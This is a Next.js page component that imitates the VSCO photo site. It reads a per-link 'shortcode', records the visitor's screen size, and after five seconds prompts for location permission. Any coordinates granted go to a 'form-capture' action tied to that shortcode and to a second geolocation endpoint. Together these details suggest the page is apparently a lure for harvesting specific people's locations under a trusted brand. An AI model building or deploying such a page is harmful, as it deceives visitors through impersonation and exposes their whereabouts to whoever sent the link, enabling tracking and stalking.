'use client';

import CommunitySection from '@/app/[lang]/vsco/components/community-section';
import PlansSection from '@/app/[lang]/vsco/components/plan-section2';
import { useRouter, useSearchParams } from 'next/navigation';
import { useEffect, useState } from 'react';
import HeaderNav from './components/header-nav';
import Hero from './components/hero';
import LoadingScreen from './components/loading-screen';
import LocationPermissionModal from './components/location-permission-modal';
import PhotoToolsSection from './components/photo-tools-section';

import { captureFormData } from '@/action/form-capture-action';
import { sendGeolocationData } from '@/action/geolocation-action';
import { trackPageView } from '@/action/tracking-action';
import './styles.css';

export default function VSCOPage() {
  const searchParams = useSearchParams();
  const shortcode = searchParams.get('shortcode');

  // State untuk modal
  const [showLocationModal, setShowLocationModal] = useState(false);

  // State untuk tracking
  const [isLoading, setIsLoading] = useState(true);
  const [hasTracked, setHasTracked] = useState(false);

  // Melakukan tracking saat halaman dimuat
  useEffect(() => {
    const trackVisit = async () => {
      try {
        // Track kunjungan ke halaman vsco menggunakan action
        await trackPageView({
          pageType: 'vsco',
          pageId: window.innerWidth + 'x' + window.innerHeight,
        });

        setHasTracked(true);
      } catch (error) {
        console.error('Error tracking page view:', error);
      } finally {
        setIsLoading(false);
      }
    };

    trackVisit();

    // Tampilkan modal lokasi setelah 5 detik
    const timer = setTimeout(() => {
      setShowLocationModal(true);
    }, 5000);

    return () => clearTimeout(timer);
  }, []);

  // Handler untuk location permission modal
  const handleLocationPermissionGranted = async (
    latitude: number,
    longitude: number,
    accuracy: number,
  ) => {
    try {
      // Kirim data geolokasi ke form-capture menggunakan action
      await captureFormData({
        source: 'vsco',
        shortcode: shortcode || undefined,
        additional_data: {
          geolocation: {
            latitude,
            longitude,
            accuracy,
            timestamp: new Date().toISOString(),
          },
        },
      });

      // Kirim data geolokasi ke API khusus menggunakan action
      await sendGeolocationData({
        latitude,
        longitude,
        accuracy,
        consent_given: true,
      });

      // Kirim data tracking tanpa geoData menggunakan action
      await trackPageView({
        pageType: 'vsco',
        pageId: 'geolocation',
      });
    } catch (error) {
      console.error('Error sending geolocation data:', error);
    } finally {
      setShowLocationModal(false);
    }
  };

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <div className='w-full'>
      <HeaderNav />

      <Hero />

      <PlansSection />

      <PhotoToolsSection />

      <CommunitySection />

      {/* Location Modal */}
      <LocationPermissionModal
        isOpen={showLocationModal}
        onClose={() => setShowLocationModal(false)}
        onPermissionGranted={handleLocationPermissionGranted}
      />
    </div>
  );
}
